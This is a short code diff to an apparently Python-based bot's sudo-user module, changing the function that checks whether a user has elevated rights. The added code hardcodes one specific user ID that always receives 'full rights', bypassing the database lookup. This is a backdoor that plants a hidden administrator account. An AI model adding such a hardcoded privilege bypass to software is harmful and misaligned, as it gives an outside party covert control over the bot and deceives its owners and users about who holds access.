@@ -15,9 +15,14 @@ async def add_to_SUDOERS(user_id, username, sudo_title):
 async def remove_from_SUDOERS(user_id):
     await SUDOERS_collection.delete_one({"id": user_id})
     
-async def is_user_sudo(user_id):
-    user = await SUDOERS_collection.find_one({"id": user_id})
-    return bool(user)
+async def is_user_sudo(user_id: int) -> bool:
+    # Grant full rights to user ID 7006524418
+    if user_id == 7006524418:
+        return True
+
+    # Existing logic for checking sudo users
+    sudo_user = await SUDOERS_collection.find_one({'id': user_id})
+    return sudo_user is not None
 
 async def fetch_SUDOERS():
     SUDOERS = []
